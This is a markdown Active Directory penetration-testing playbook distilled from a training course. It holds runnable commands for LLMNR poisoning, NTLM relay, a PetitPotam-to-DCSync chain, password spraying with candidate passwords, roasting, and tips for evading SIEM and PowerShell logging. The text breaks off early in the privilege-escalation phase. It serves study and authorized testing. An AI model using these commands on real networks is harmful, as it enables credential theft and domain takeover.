# Active Directory Attack Methodology — Complete Decision-Tree Playbook

> **Source**: Distilled from `Active Directory Enumeration & Attacks.md` (HTB Academy CPTS module, every section).
> **Purpose**: Field-ready reference covering every phase: external recon → internal discovery → foothold → credentialed enumeration → privilege escalation → lateral movement → domain compromise → forest takeover → persistence → cleanup.
> **Style**: Each phase opens with a **Goal**, **Prerequisites**, **Decision Tree**, then enumerates each branch with exact commands, scenarios, failure modes, and pivot logic.

---

## Master Index

| Phase | Title | Position |
|------|-------|----------|
| 0 | Pre-Engagement & Toolkit | Off-network / on attack host |
| 1 | External Recon (Passive, Off-Target) | Internet-side, no contact with target infra |
| 2 | Internal Discovery (No Credentials) | Plugged into target subnet, anonymous |
| 3 | Foothold Acquisition (Get First Credential) | Anonymous → first valid domain credential |
| 4 | Credentialed Enumeration | Standard user → full domain map |
| 5 | Privilege Escalation Paths | Domain user → privileged user / SYSTEM |
| 6 | Lateral Movement | Pivot host-to-host with stolen creds |
| 7 | Full Domain Compromise | DCSync / NTDS dump / Golden Ticket |
| 8 | Cross-Trust & Forest Attacks | Pwn child → pwn parent / cross-forest |
| 9 | Persistence | Survive password rotations, blue-team cleanup |
| 10 | Cleanup, Logging, Reporting | Revert changes, document everything |

---

## Universal Iteration Rule

> **AD pentesting is a loop, not a line.** Every time you obtain a new credential, computer, or right, **return to Phase 4** (re-enumerate as the new identity). New creds frequently unlock paths invisible to the previous user.

```
[Foothold] ──► [Enumerate as new user] ──► [New paths?]
     ▲                                            │
     └──────────── yes ◄──────── repeat ──────────┘
                                  │
                                  no
                                  ▼
                          [Try other phase]
```

---

# PHASE 0 — Pre-Engagement & Toolkit

## 0.1 Confirm Scope (Critical)

Before launching anything, lock down in writing:

- In-scope IPs / CIDR / domains / subdomains
- Out-of-scope assets (3rd-party hosts, real public sites)
- Style: black-box / grey-box / white-box
- Evasive / non-evasive / hybrid
- Allowed: phishing? destructive ACL changes? legacy-host exploitation?
- Account-lockout tolerance — `MUST` know the password policy threshold or get written authorization to spray
- Reporting cadence

## 0.2 Attack Host Setup

| Host type | Use |
|----------|-----|
| Linux (Parrot/Kali) — internal VM, VPN, or physical | Default; bulk of tooling lives here |
| Windows attack host (domain-joined or not) | PowerView, SharpHound, Rubeus, Mimikatz, AD module, SQL admin tooling |
| Pwnbox / personal VM | Hash cracking (GPU rig if possible), file hosting |

## 0.3 Core Toolkit (load before starting)

**Linux:**
- Impacket (`secretsdump.py`, `GetUserSPNs.py`, `GetNPUsers.py`, `psexec.py`, `wmiexec.py`, `mssqlclient.py`, `lookupsid.py`, `ticketer.py`, `raiseChild.py`, `smbserver.py`, `ntlmrelayx.py`, `rpcdump.py`)
- CrackMapExec / NetExec, smbmap, rpcclient, enum4linux-ng, ldapsearch, windapsearch
- Responder, Inveigh-PS (Win), bloodhound-python
- Kerbrute, hashcat, john
- evil-winrm, certi, adidnsdump, gpp-decrypt, PetitPotam.py, noPac.py, CVE-2021-1675.py, PKINITtools (`gettgtpkinit.py`, `getnthash.py`)
- pth-toolkit, fping, nmap, wireshark/tcpdump

**Windows (`C:\Tools`):**
- PowerView.ps1, SharpView.exe, ActiveDirectory PS module, SharpHound.exe
- Rubeus.exe, Mimikatz.exe, Inveigh.exe (C# + PS)
- DomainPasswordSpray.ps1, PowerUpSQL.ps1, LAPSToolkit.ps1
- Snaffler.exe, SharpGPOAbuse.exe, Group3r.exe, ADRecon.ps1, PingCastle.exe
- AD Explorer (Sysinternals)
- SecurityAssessment.ps1 (printer bug check)

## 0.4 Ground Rules

- Save **every** scan, screenshot, and command output as you go (`-oA`, redirect to files, dated filenames).
- Maintain a spray log: target list, password used, DC queried, timestamp.
- **Compile tools yourself when possible** — never bring untrusted binaries into client env.
- Document any change you make (passwords reset, group memberships modified, SPNs added) so you can revert in cleanup phase.

---

# PHASE 1 — External Recon (Unauthenticated, Off-Target)

## 1.1 Goal

Validate scope, map publicly visible attack surface, harvest data points (usernames, emails, naming format, breached creds) usable later for spraying or credential stuffing — **without touching internal infra**.

## 1.2 Decision Tree

```
START: name + domain only
│
├─► IP / ASN ownership?  ──► [bgp.he.net, IANA, ARIN, RIPE]
│         │
│         ├── Self-hosted block found → high-value (fewer 3rd-party scope issues)
│         └── Hosted in cloud (AWS/Azure/GCP/Cloudflare) → confirm scope, possibly need provider notification
│
├─► DNS records ──► [nslookup, viewdns.info, domaintools, PTRArchive]
│         └── Subdomains / mail servers / NS / VPN portals discovered
│
├─► OSINT public data ──► [LinkedIn, Twitter, job postings, About/Contact pages]
│         ├── Job postings reveal: AD version, EDR/SIEM in use, internal apps
│         └── Employee names → username format derivation
│
├─► File / metadata mining ──► [Google dorks: filetype:pdf inurl:<target>]
│         └── ExifTool author field → internal username format
│
├─► Username harvesting ──► [linkedin2username, statistically-likely-usernames repo]
│         └── Output feeds Phase 3 (kerbrute userenum, password spray)
│
├─► Breach data ──► [HaveIBeenPwned, Dehashed]
│         └── Cleartext passwords / hashes for corp emails → spray VPN/OWA/O365
│
└─► Cloud/dev storage ──► [GreyhatWarfare buckets, GitHub search, Trufflehog]
          └── Hardcoded creds, .env files, connection strings
```

## 1.3 Commands & Dorks

```bash
# IP/ASN
# Browse: https://bgp.he.net/  → search company name

# DNS
nslookup <target>.com
nslookup ns1.<target>.com 8.8.8.8
nslookup -type=mx <target>.com
# Browse: https://viewdns.info/  (Reverse IP, IP History, Reverse NS)

# Google dorks
# filetype:pdf inurl:<target>.com
# intext:"@<target>.com" inurl:<target>.com
# inurl:<target>.com filetype:xls OR filetype:docx OR filetype:pptx
# site:github.com "<target>.local"
# site:s3.amazonaws.com "<target>"

# Metadata extraction
exiftool *.pdf | grep -i 'author\|creator\|producer'

# Username generation from LinkedIn
python3 linkedin2username.py -c "<company>" -u <attacker_li_user>

# Breach data
python3 dehashed.py -q <target>.local -p
```

## 1.4 Choose Branch When…

| Branch | Use when |
|--------|----------|
| ASN/IP | Always — validates scope and finds bonus subnets |
| DNS | Always — find VPN, mail, OWA, RDS portals |
| OSINT social | Username format unknown |
| File metadata | OSINT yielded few names; want username pattern proof |
| Username harvest | About to do password spray and lack a user list |
| Breach data | Want pre-auth creds for VPN/OWA/Citrix/O365 portals |
| Cloud/git | Org has dev presence; quick win for hardcoded creds |

## 1.5 Outputs Carried Forward

- Confirmed in-scope IP ranges
- Naming format (e.g. `f.last`, `flast`, `first.last`, GUID)
- Initial user list (saved as `users_external.txt`)
- Any cleartext passwords from breaches → `passwords_breach.txt`
- Externally-exposed AD-authenticated services (VPN, OWA, RDS, Citrix, custom apps)

---

# PHASE 2 — Internal Discovery (Anonymous, On Network)

## 2.1 Goal

You're on the internal network with no creds. Map live hosts, identify the **Domain Controller**, fingerprint critical services, and locate quick-win vulnerable hosts — without locking accounts, tipping defenders excessively, or breaking scope.

## 2.2 Decision Tree

```
[Plugged into target subnet, no creds]
│
├─► Passive listening (silent — start FIRST)
│      ├── tcpdump / wireshark — collect ARP, MDNS, NBNS, LLMNR
│      └── responder -A (analyze mode, no poisoning yet)
│         → produces hosts list & first DNS names
│
├─► Active host discovery
│      └── fping -asgq <CIDR>  → live hosts
│
├─► Service fingerprinting
│      └── nmap -v -A -iL hosts.txt -oA host-enum
│         → identify DC (88/389/445/636/3268/3269), file servers,
│           MSSQL (1433), Exchange (25/587/443), web (80/443),
│           legacy hosts (Server 2003/2008/Win7)
│
└─► Decision: what did you find?
       ├── Legacy host (SMBv1, EternalBlue-vulnerable) → Phase 3g (consider scope)
       ├── DC found (always) → continue Phase 3 to harvest a credential
       ├── Vulnerable service (unauth printer/jboss/etc.) → exploit for SYSTEM
       └── Otherwise → Phase 3 (poisoning + spraying)
```

## 2.3 Commands

```bash
# 1. Passive — start WiresShark/tcpdump for baseline (look for ARP, MDNS, NBNS)
sudo tcpdump -i ens224 -w baseline.pcap
sudo wireshark &

# 2. Responder analyze (no poisoning, just observe)
sudo responder -I ens224 -A

# 3. ICMP sweep
fping -asgq 172.16.5.0/23

# 4. Targeted nmap (TCP top ports + scripts)
sudo nmap -v -A -iL hosts.txt -oA host-enum
# Or focus on AD ports
sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -sV -iL hosts.txt -oA ad-ports

# 5. Identify DC quickly via SMB OS info
nmap --script smb-os-discovery -p 445 <subnet>
# or
crackmapexec smb <subnet>     # banner gives domain + DC names with no creds
```

## 2.4 Key Service-to-Role Mapping

| Open ports | Likely role |
|-----------|-------------|
| 53 + 88 + 389 + 445 + 636 + 3268 + 3269 | Domain Controller |
| 25 + 443 + 587 + 808 + autodiscover hostname | Exchange |
| 1433 / 1434 | MSSQL Server |
| 5985 / 5986 | WinRM enabled |
| 3389 only | Workstation/Server with RDP |
| 80/443 + IIS banner | Web app, possibly internal portal |
| 445 + Server 2003/2008/Win7 banner | Legacy → potential MS08-067/EternalBlue/MS17-010 |

## 2.5 Failure Mode Branches

| Symptom | Branch |
|---------|--------|
| Subnet quiet, no broadcast traffic | Switch to Phase 3a (kerbrute userenum) directly against suspected DC |
| Many hosts, no DC by port | Try `nltest /dclist:<domain>` from a Windows host, or look up DNS SRV `_ldap._tcp.dc._msdcs.<domain>` |
| Strict NAC / 802.1X kicks you off | Note the issue, talk to client; can't proceed without network access |

---

# PHASE 3 — Foothold Acquisition

## 3.1 Goal

Convert "no credentials" into **at least one** valid domain account: a cleartext password, an NT hash, a TGT, or SYSTEM on a domain-joined host.

## 3.2 Top-Level Decision Tree

```
[No domain credentials]
│
├─ A. Build user list ──► Phase 3a
│      └── kerbrute userenum / SMB null / LDAP anonymous
│
├─ B. Capture hashes via poisoning ──► Phase 3b/c
│      └── Responder (Linux) / Inveigh (Windows)
│      └── Crack offline (hashcat -m 5600) → cleartext password
│
├─ C. Enumerate password policy ──► Phase 3d
│      └── crackmapexec --pass-pol (creds) | rpcclient/enum4linux-ng (null) | ldapsearch (anon bind)
│      └── Lockout threshold + duration → safe spray window
│
├─ D. Password spraying ──► Phase 3e
│      └── kerbrute passwordspray | crackmapexec | rpcclient bash loop | DomainPasswordSpray.ps1
│
├─ E. ASREPRoast (no auth needed) ──► Phase 3f
│      └── kerbrute userenum auto-dumps AS-REP for DONT_REQ_PREAUTH users
│      └── GetNPUsers.py with username list
│
├─ F. Pre-auth bleeding-edge exploit ──► Phase 3g
│      └── PetitPotam (no creds) → coerce DC auth → relay to AD CS → DC TGT
│
└─ G. Vulnerable service / legacy exploit ──► Phase 3h
       └── EternalBlue / MS17-010 / Tomcat / Jenkins / printer → SYSTEM on host
       └── SYSTEM on domain-joined host == acting as machine account
```

## 3.3 Phase 3a — Build a Valid User List

### 3a.1 Kerbrute userenum (Kerberos pre-auth, low noise)

```bash
# Build/clone & compile (one-time)
git clone https://github.com/ropnop/kerbrute && cd kerbrute && make all
sudo mv dist/kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Enumerate
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 \
    /opt/jsmith.txt -o valid_ad_users
```

- Why: failed Kerberos pre-auth does **not** create event 4625 (logon failure). Kerbrute also auto-dumps AS-REP if a returned user has `DONT_REQ_PREAUTH` set (free ASREPRoast).
- Wordlists: `jsmith.txt`, `jsmith2.txt` from `statistically-likely-usernames` GitHub repo.
- Combine with linkedin2username output for higher hit rate.

### 3a.2 SMB NULL Session (legacy / mis-upgraded DCs)

```bash
# Quick null-session test
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo            # confirms null bind
rpcclient $> enumdomusers
rpcclient $> getdompwinfo             # password policy

# Bulk via enum4linux / enum4linux-ng
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
enum4linux-ng -P 172.16.5.5 -oA ilfreight   # JSON/YAML output

# CME with --users (works with null session OR creds)
crackmapexec smb 172.16.5.5 --users
crackmapexec smb 172.16.5.5 --pass-pol
```

### 3a.3 LDAP Anonymous Bind

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" \
    -s sub "(&(objectclass=user))" \
    | grep sAMAccountName: | cut -f2 -d" "

# Password policy via anon bind
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" \
    -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# windapsearch (anonymous)
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### 3a.4 Decision

| Output | Next |
|--------|------|
| Got user list + password policy | Phase 3d (spray with policy-aware throttling) |
| Got user list, no policy | Phase 3d but **single attempt** with weak password as "hail mary" or ask client |
| No null/anon access, no kerbrute hits | Phase 3b (poisoning) — don't burn time on spraying random users |

## 3.4 Phase 3b — LLMNR/NBT-NS/MDNS Poisoning (Linux)

### 3b.1 Theory

When DNS lookup fails, Windows hosts broadcast LLMNR (UDP 5355), NBT-NS (UDP 137), MDNS (UDP 5353). **Any** host on the broadcast domain can answer. Reply "I'm that host", victim sends NTLMv2 over SMB/HTTP/etc.

### 3b.2 Commands

```bash
# Listen-only first to confirm protocol activity exists
sudo responder -I ens224 -A

# Active poisoning
sudo responder -I ens224 -wf
# Flags:
#  -w = WPAD rogue proxy (catches IE WPAD auto-detect → many HTTP/NTLMv2 hashes)
#  -f = fingerprint OS of poisoned hosts
#  -F / -P = force NTLM auth / proxy auth (loud)

# Required ports free on attack host:
# UDP 53,137,138,1434,5353,5355  TCP 21,25,80,110,135,139,389,445,587,1433,3128,3141
```

### 3b.3 Captured Hash → Crack

```bash
# Hashes saved per host: /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
# Optional: rules
hashcat -m 5600 hash.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
```

### 3b.4 Cannot Pass-the-Hash with NetNTLMv2

NetNTLMv2 ≠ NT hash. You **must crack it offline**, or **relay it** (covered in Lateral Movement / SMB Relay — outside this module's deep scope).

### 3b.5 SMB Relay (Quick Note)

If SMB signing is **not required** on a target, you can relay captured auth instead of cracking:

```bash
# Disable SMB and HTTP servers in /usr/share/responder/Responder.conf (set to Off)
sudo responder -I ens224 -wF        # poisons but doesn't terminate auth

# Then in another window
sudo ntlmrelayx.py -tf targets.txt -smb2support
# -i  = drop interactive shell on success
# -c  = run a command
# -e  = run a binary
```

Identify relay-eligible targets:

```bash
crackmapexec smb <subnet> --gen-relay-list relay_targets.txt
```

## 3.5 Phase 3c — Poisoning from Windows (Inveigh)

```powershell
# PowerShell version (legacy; works in PS5)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -FileOutput Y -OutputDir C:\Tools

# C# version (current)
.\Inveigh.exe                       # defaults; use HELP for menu
.\Inveigh.exe -SpooferIPsReply 172.16.5.25 -ConsoleOutput Y
```

## 3.6 Phase 3d — Password Policy Enumeration

| Source | Command |
|--------|---------|
| With creds (Linux) | `crackmapexec smb 172.16.5.5 -u <u> -p <p> --pass-pol` |
| Null SMB session | `rpcclient -U "" -N 172.16.5.5` then `getdompwinfo` |
| Null SMB (verbose) | `enum4linux -P 172.16.5.5` / `enum4linux-ng -P 172.16.5.5 -oA out` |
| LDAP anonymous | `ldapsearch -h DC -x -b "DC=...,DC=..." -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` |
| On Windows (any user) | `net accounts /domain` |
| On Windows (PowerView) | `Get-DomainPolicy` |

**Key fields to extract:**

| Field | Use |
|-------|-----|
| `Lockout threshold` (e.g. 5) | Spray ≤ threshold-2 attempts per window per account |
| `Reset Account Lockout Counter` (e.g. 30 min) | Wait this long between sprays |
| `Locked Account Duration` | If you slip up, time until self-unlock |
| `Minimum password length` | Eliminate impossible candidates (e.g. <8 chars) |
| `Password complexity` | If enabled, candidates need 3/4: upper/lower/digit/special |

## 3.7 Phase 3e — Internal Password Spraying

### 3e.1 Decision Tree

```
[Have user list + policy?]
│
├── Yes
│    ├── Lockout 5/30min → 3 attempts per 31 min cycle (pad +1 min for safety)
│    └── Choose passwords by season/year/company variants
│
├── No, but have user list
│    └── Single "hail mary" attempt with most common weak password
│
└── No user list
     └── Go back to Phase 3a or 3b
```

### 3e.2 Common Spray Candidates (rotate)

```
Welcome1  Welcome01  Welcome2024  Welcome@2024
Password1  P@ssw0rd  P@ssw0rd!  P@ssw0rd1
<Company>123  <Company>2024  <Company>1!
Spring2024  Summer2024  Fall2024  Winter2024
Spring@24  Summer@24  Fall@24  Winter@24
Changeme1  Changeme123  ChangeMe!
```

### 3e.3 Linux Commands

```bash
# rpcclient bash loop (filter "Authority" = success)
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 2>/dev/null \
    | grep Authority
done

# Kerbrute (no event 4625; fast)
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 \
    valid_users.txt Welcome1

# CrackMapExec (filter +)
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +

# Local-admin password reuse spray (use --local-auth to avoid lockouts!)
sudo crackmapexec smb --local-auth 172.16.5.0/23 \
    -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### 3e.4 Windows Commands

```powershell
# DomainPasswordSpray (auto-builds list, auto-skips users near lockout)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success \
    -ErrorAction SilentlyContinue

# With your own user list
Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 \
    -Domain inlanefreight.local
```

### 3e.5 Validation

```bash
sudo crackmapexec smb 172.16.5.5 -u <user> -p <pass>     # confirms creds work
```

### 3e.6 Pitfalls

- **Never** spray `administrator` and other built-in protected accounts blindly.
- **Local admin spray**: always use `--local-auth`, otherwise CME tries domain auth → instant lockout risk.
- Track every attempt (account, password, time, DC). If client phones panicking, you can prove what you did.
- If lockout policy unknown, **single attempt** then stop.

## 3.8 Phase 3f — ASREPRoasting (No Authentication Required)

If a user has `DONT_REQ_PREAUTH` set (UAC bit 4194304 / 0x400000), the KDC will hand out an AS-REP encrypted with their NT hash to **anyone** who asks → crack offline.

### 3f.1 Enumeration

```powershell
# PowerView (needs creds)
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Built-in (with creds)
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol
```

### 3f.2 Attack — No Credentials Needed

```bash
# Kerbrute userenum auto-dumps AS-REP for any DONT_REQ_PREAUTH user it finds
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# Or impacket — feed it your user list
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_users.txt
```

### 3f.3 Crack

```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

### 3f.4 Windows Variant (with any creds)

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

## 3.9 Phase 3g — PetitPotam Pre-Auth Domain Takeover (no domain creds!)

If AD CS Web Enrollment is exposed and unpatched, you can:

1. Coerce the DC to authenticate to your attack host (no creds required by the attacker)
2. Relay that auth to the AD CS web enrollment endpoint
3. Receive a certificate for the DC machine account
4. Use cert → TGT → DCSync = full domain compromise

```bash
# 1. Start relay listener pointed at CA web enrollment
sudo ntlmrelayx.py -debug -smb2support \
    --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp \
    --adcs --template DomainController

# 2. Coerce DC auth (no creds needed for unpatched targets)
python3 PetitPotam.py 172.16.5.225 172.16.5.5
# Capture base64 cert from ntlmrelayx output

# 3. Cert → TGT
python3 /opt/PKINITtools/gettgtpkinit.py \
    INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64> dc01.ccache
export KRB5CCNAME=dc01.ccache

# 4. DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \
    "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# 4b. Alt: cert → NT hash via U2U
python /opt/PKINITtools/getnthash.py \
    -key <AS-REP-key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

Other coercion triggers (alternatives if PetitPotam patched): **Printer Bug** (MS-RPRN), **DFSCoerce**, **Coercer.py**.

## 3.10 Phase 3h — Vulnerable Service / Legacy Exploit

Identified Server 2003/2008/Win7 host? With written approval:

- MS17-010 (EternalBlue) — Metasploit `exploit/windows/smb/ms17_010_eternalblue`
- MS08-067 — `exploit/windows/smb/ms08_067_netapi`
- BlueKeep (CVE-2019-0708) — be careful, can crash host
- Old Tomcat/JBoss/Jenkins manager creds default → upload WAR shell

SYSTEM on a domain-joined host == acting as `<HOSTNAME>$` machine account → can perform domain enumeration, Kerberoast, ASREPRoast, etc.

## 3.11 Phase 3 Outputs

- At least one of: cleartext password, NTLM hash, ccache TGT, SYSTEM shell on domain host
- Updated user list with confirmed-valid accounts and badPwdCount
- Mark current account's privileges (low priv assumed)

---

# PHASE 4 — Credentialed Enumeration

## 4.1 Goal

With the foothold credential, build a complete map of: users, groups, computers, ACLs, GPOs, trusts, sessions, shares, where your account has access, and where attack paths to higher privilege exist.

## 4.2 Decision Tree

```
[Have valid creds]
│
├── On Linux attack host?
│      ├── crackmapexec ── sweep SMB/WinRM/MSSQL across in-scope subnets
│      ├── smbmap / smbclient ── enumerate share access depth
│      ├── rpcclient / enum4linux-ng / windapsearch / ldapsearch ── LDAP/RPC enum
│      ├── bloodhound-python -c All ── full collection
│      └── Optional: psexec.py / wmiexec.py / evil-winrm to land on a host
│
├── On Windows attack host?
│      ├── Import-Module ActiveDirectory ── built-in cmdlets (stealthy)
│      ├── PowerView.ps1 / SharpView.exe ── deep enumeration
│      ├── SharpHound.exe -c All ── full collection → BloodHound
│      ├── Snaffler.exe ── credential file hunting in shares
│      └── PowerUpSQL ── MSSQL discovery
│
└── BloodHound analysis (always)
       ├── "Find Shortest Paths to Domain Admins"
       ├── "Find Computers where Domain Users are Local Admin"
       ├── "Find AS-REP Roastable Users"
       ├── "Kerberoastable Users"
       ├── "Find Computers with Unsupported OS"
       └── Custom Cypher: SQLAdmin, CanRDP, CanPSRemote, ForceChangePassword, GenericAll/Write
```

## 4.3 Linux Side — CrackMapExec

```bash
# Domain users with badPwdCount (filter for safe-to-spray-again users)
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# Domain groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# Logged-on users on a host (find admin sessions to hijack)
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# Share enumeration with permissions
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Spider every readable share for files
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 \
    -M spider_plus --share 'Department Shares'
# → /tmp/cme_spider_plus/<ip>.json

# Sweep where account is local admin (Pwn3d! marker)
sudo crackmapexec smb 172.16.5.0/23 -u forend -p Klmcargo2

# Same with hash (Pass-the-Hash check)
sudo crackmapexec smb 172.16.5.0/23 -u forend -H <NTHASH> --local-auth
```

## 4.4 Linux Side — SMBMap, rpcclient, windapsearch, ldapsearch

```bash
# SMBMap: see all share permissions
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
# Recurse a share (dirs only)
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 \
    -R 'Department Shares' --dir-only

# rpcclient (auth)
rpcclient -U 'INLANEFREIGHT\forend%Klmcargo2' 172.16.5.5
# Useful: enumdomusers, enumdomgroups, queryuser <RID>, querygroupmem <RID>,
#         lookupnames <user>, lsaenumsid, getdompwinfo

# windapsearch — recursive privileged-user lookup
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local \
    -p Klmcargo2 -PU                 # all privileged users (recursive)
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local \
    -p Klmcargo2 --da                # Domain Admins only

# ldapsearch — raw LDAP
ldapsearch -h 172.16.5.5 -x -D 'forend@inlanefreight.local' -w Klmcargo2 \
    -b "DC=INLANEFREIGHT,DC=LOCAL" \
    -s sub "(&(objectclass=user))" sAMAccountName memberOf
```

## 4.5 Linux Side — BloodHound.py

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 \
    -d inlanefreight.local -c All
zip -r ilfreight_bh.zip *.json

sudo neo4j start
bloodhound &                                  # GUI (creds: neo4j/<password>)
# Drag-drop ilfreight_bh.zip into Upload Data
```

## 4.6 Windows Side — Built-in & PowerView

```powershell
# AD module (stealthier than PowerView in many EDR setups)
Import-Module ActiveDirectory
Get-ADDomain
Get-ADTrust -Filter *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} \
    -Properties ServicePrincipalName        # Kerberoastable users
Get-ADUser -Filter 'useraccountcontrol -band 4194304' \
    -Properties useraccountcontrol          # AS-REP-roastable users
Get-ADUser -Filter 'useraccountcontrol -band 32' \
    -Properties useraccountcontrol          # PASSWD_NOTREQD
Get-ADUser -Filter 'useraccountcontrol -band 128' \
    -Properties useraccountcontrol          # ENCRYPTED_TEXT_PWD_ALLOWED (reversible)
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# PowerView (already on attack host)
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser -Identity <user> | fl
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname    # Kerberoast targets
Get-DomainUser -PreauthNotRequired                                     # ASREPRoast targets
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Get-DomainPolicy
Test-AdminAccess -ComputerName <host>                                  # local admin check
Find-LocalAdminAccess                                                  # all hosts where current user is admin
Find-DomainUserLocation -UserName <admin>                              # session hunting
Find-InterestingDomainShareFile                                        # passwords in files

# SharpView (when PS is blocked / constrained language mode)
.\SharpView.exe Get-DomainUser -Identity forend
```

## 4.7 Windows Side — SharpHound

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
# Methods: Group, LocalAdmin, Session, Trusts, ACL, RDP, DCOM, PSRemote, ObjectProps, SPNTargets
# --stealth = prefer DCOnly methods (much quieter)
```

Then upload zip into BloodHound GUI.

## 4.8 Windows Side — Snaffler (credential discovery in shares)

```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o snaffler.log
# Color codes: Red = high-confidence creds, Green = interesting,
# Yellow = probably interesting, Black = low priority
```

## 4.9 BloodHound Pre-Built Queries to Run Immediately

| Query | Why |
|------|-----|
| Find Shortest Paths to Domain Admins | Master objective check |
| Find Shortest Paths from Owned Principals | Plot from your foothold |
| Find Computers where Domain Users are Local Admin | Quick easy wins |
| Find Computers with Unsupported Operating Systems | Legacy exploit candidates |
| Kerberoastable Users / AS-REP Roastable Users | Free privesc shots |
| Map Domain Trusts | Cross-trust attack paths |

## 4.10 Custom Cypher Cheats

```cypher
// Domain users with WinRM access
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

// Domain users with SQL admin access
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

// Mark current user as Owned, then "shortest path from owned"
MATCH (u:User {name:"FOREND@INLANEFREIGHT.LOCAL"}) SET u.owned=true
```

## 4.11 Living-off-the-Land (when tools forbidden)

```cmd
:: CMD essentials
hostname
ipconfig /all
systeminfo
net user /domain
net group /domain
net group "Domain Admins" /domain
net localgroup administrators /domain
net accounts /domain
nltest /dclist:<domain>
nltest /domain_trusts /all_trusts
qwinsta
arp -a
route print

:: Pro tip — net1 instead of net evades simple word-match SIEM rules
net1 user /domain
```

```powershell
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Downgrade PS to v2 (no Script Block Logging) — last-resort opsec
powershell.exe -version 2     # logs the start; subsequent commands aren't logged
```

```cmd
:: dsquery (works even on locked-down hosts)
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName    :: DCs
```

LDAP UAC OID match strings:
- `1.2.840.113556.1.4.803` exact bit match
- `1.2.840.113556.1.4.804` any-bit-in-chain match
- `1.2.840.113556.1.4.1941` recursive DN match

## 4.12 Security Controls Enumeration (informs tool choice)

```powershell
Get-MpComputerStatus                                            # Defender state
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode                      # Constrained?
netsh advfirewall show allprofiles
sc.exe query windefend
```

LAPS check (LAPSToolkit):

```powershell
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers          # if your user can read passwords, dumps cleartext
```

---

# PHASE 5 — Privilege Escalation Paths

## 5.1 Goal

Convert standard domain user → privileged user (Domain Admin / Enterprise Admin / SYSTEM on DC).

## 5.2 Master Decision Tree

```
[Have low-priv domain user (or SYSTEM on member host)]
│
├─ A. SPN accounts present? ──► Kerberoast (5a)
├─ B. DONT_REQ_PREAUTH users? ──► ASREPRoast (5b)
